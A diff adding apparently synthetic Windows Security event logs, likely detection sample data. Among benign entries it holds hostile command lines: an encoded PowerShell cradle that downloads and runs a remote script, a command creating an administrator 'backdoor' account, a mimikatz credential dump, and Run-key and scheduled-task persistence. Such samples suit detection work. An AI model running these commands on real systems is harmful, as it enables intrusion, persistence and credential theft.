@@ -1,0 +1,232 @@
+2024-04-13 08:15:23
+Event ID: 4625
+Log Name: Security
+Source: Microsoft-Windows-Security-Auditing
+Description: An account failed to log on.
+Subject:
+    Security ID: SYSTEM
+    Account Name: DESKTOP-PC$
+    Account Domain: WORKGROUP
+Target Account:
+    Account Name: Administrator
+    Account Domain: DESKTOP-PC
+Failure Information:
+    Failure Reason: Unknown user name or bad password
+    Status: 0xC000006D
+    Sub Status: 0xC000006A
+Process Information:
+    Caller Process Name: C:\Windows\System32\svchost.exe
+Network Information:
+    Workstation Name: DESKTOP-PC
+    Source Network Address: 192.168.1.105
+    Source Port: 52341
+
+2024-04-13 08:15:45
+Event ID: 4625
+Log Name: Security
+Source: Microsoft-Windows-Security-Auditing
+Description: An account failed to log on.
+Target Account:
+    Account Name: Administrator
+    Account Domain: DESKTOP-PC
+Failure Information:
+    Failure Reason: Unknown user name or bad password
+Network Information:
+    Source Network Address: 192.168.1.105
+
+2024-04-13 08:16:12
+Event ID: 4625
+Log Name: Security
+Source: Microsoft-Windows-Security-Auditing
+Description: An account failed to log on.
+Target Account:
+    Account Name: Administrator
+    Account Domain: DESKTOP-PC
+Failure Information:
+    Failure Reason: Unknown user name or bad password
+Network Information:
+    Source Network Address: 192.168.1.105
+
+2024-04-13 08:45:30
+Event ID: 4672
+Log Name: Security
+Source: Microsoft-Windows-Security-Auditing
+Description: Special privileges assigned to new logon.
+Subject:
+    Security ID: S-1-5-21-3623811015-3361044348-30300820-1013
+    Account Name: dbadmin
+    Account Domain: CORP
+Privileges: SeSecurityPrivilege
+             SeBackupPrivilege
+             SeRestorePrivilege
+             SeTakeOwnershipPrivilege
+             SeDebugPrivilege
+             SeSystemEnvironmentPrivilege
+             SeLoadDriverPrivilege
+             SeImpersonatePrivilege
+
+2024-04-13 09:22:18
+Event ID: 4720
+Log Name: Security
+Source: Microsoft-Windows-Security-Auditing
+Description: A user account was created.
+Subject:
+    Account Name: admin_john
+    Account Domain: CORP
+New Account:
+    Account Name: backup_svc
+    Account Domain: CORP
+Attributes:
+    SAM Account Name: backup_svc
+    Display Name: Backup Service Account
+    User Principal Name: -
+    Home Directory: -
+    Home Drive: -
+    Script Path: -
+    Profile Path: -
+    User Workstations: -
+
+2024-04-13 10:15:42
+Event ID: 4688
+Log Name: Security
+Source: Microsoft-Windows-Security-Auditing
+Description: A new process has been created.
+Creator Subject:
+    Account Name: user01
+    Account Domain: CORP
+New Process Information:
+    New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    Token Elevation Type: %%1936
+    Process Command Line: powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAG0AYQBsAHcAYQByAGUALgBwAHMAMQAnACkA
+
+2024-04-13 11:30:15
+Event ID: 4648
+Log Name: Security
+Source: Microsoft-Windows-Security-Auditing
+Description: A logon was attempted using explicit credentials.
+Subject:
+    Account Name: user01
+    Account Domain: CORP
+Account Whose Credentials Were Used:
+    Account Name: Administrator
+    Account Domain: SERVER01
+Target Server:
+    Target Server Name: SERVER01.corp.local
+    Additional Information: -
+Process Information:
+    Process Name: C:\Windows\System32\mstsc.exe
+Network Information:
+    Network Address: 10.10.10.50
+
+2024-04-13 12:05:33
+Event ID: 4698
+Log Name: Security
+Source: Microsoft-Windows-Security-Auditing
+Description: A scheduled task was created.
+Subject:
+    Account Name: system_admin
+    Account Domain: CORP
+Task Information:
+    Task Name: \Microsoft\Windows\UpdateOrchestrator\Backup
+    Task Content: <?xml version="1.0" encoding="UTF-16"?>
+        <Task version="1.2">
+        <Actions Context="Author">
+            <Exec>
+            <Command>C:\Windows\Temp\update.exe</Command>
+            </Exec>
+        </Actions>
+        </Task>
+
+2024-04-13 13:20:47
+Event ID: 4657
+Log Name: Security
+Source: Microsoft-Windows-Security-Auditing
+Description: A registry value was modified.
+Subject:
+    Account Name: user02
+    Account Domain: CORP
+Object:
+    Object Name: \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SecurityUpdate
+    Value Name: C:\Users\Public\svchost.exe
+Process Information:
+    Process Name: C:\Windows\System32\reg.exe
+
+2024-04-13 14:15:22
+Event ID: 5140
+Log Name: Security
+Source: Microsoft-Windows-Security-Auditing
+Description: A network share object was accessed.
+Subject:
+    Account Name: contractor01
+    Account Domain: CORP
+Network Information:
+    Source Address: 192.168.1.150
+    Source Port: 49234
+Share Information:
+    Share Name: \\SERVER01\C$\Users\Administrator\Documents
+    Share Path: \??\C:\Users\Administrator\Documents
+Access Request Information:
+    Access Mask: 0x1
+    Accesses: ReadData (or ListDirectory)
+
+2024-04-13 14:30:10
+Event ID: 4624
+Log Name: Security
+Source: Microsoft-Windows-Security-Auditing
+Description: An account was successfully logged on.
+Subject:
+    Account Name: regularuser
+    Account Domain: CORP
+Logon Information:
+    Logon Type: 3
+    Restricted Admin Mode: -
+Network Information:
+    Source Network Address: 192.168.1.75
+    Source Port: 52145
+
+2024-04-13 15:10:05
+Event ID: 4688
+Log Name: Security
+Source: Microsoft-Windows-Security-Auditing
+Description: A new process has been created.
+New Process Information:
+    New Process Name: C:\Windows\System32\cmd.exe
+    Process Command Line: cmd.exe /c net user backdoor P@ssw0rd! /add && net localgroup administrators backdoor /add
+
+2024-04-13 16:22:33
+Event ID: 4625
+Log Name: Security
+Source: Microsoft-Windows-Security-Auditing
+Description: An account failed to log on.
+Target Account:
+    Account Name: sa
+    Account Domain: SQL-SERVER
+Failure Information:
+    Failure Reason: Unknown user name or bad password
+Network Information:
+    Source Network Address: 203.0.113.45
+
+2024-04-13 17:05:18
+Event ID: 4672
+Log Name: Security
+Source: Microsoft-Windows-Security-Auditing
+Description: Special privileges assigned to new logon.
+Subject:
+    Account Name: SYSTEM
+    Account Domain: NT AUTHORITY
+Privileges: SeTcbPrivilege
+             SeBackupPrivilege
+             SeRestorePrivilege
+             SeDebugPrivilege
+
+2024-04-13 17:45:29
+Event ID: 4688
+Log Name: Security
+Source: Microsoft-Windows-Security-Auditing
+Description: A new process has been created.
+New Process Information:
+    New Process Name: C:\Users\Public\Downloads\mimikatz.exe
+    Process Command Line: mimikatz.exe sekurlsa::logonpasswords
+Creator Subject:
+    Account Name: compromised_user
+    Account Domain: CORP
